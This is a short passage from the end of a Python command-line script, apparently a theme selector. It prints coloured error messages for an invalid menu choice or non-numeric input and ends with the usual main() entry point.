                    print(f"{get_current_theme()['primary']}Invalid choice. No theme changed.{get_current_theme()['reset']}")

            except ValueError:

                print(f"{get_current_theme()['primary']}Invalid input. Please enter a number.{get_current_theme()['reset']}")



if __name__ == "__main__":

    main()
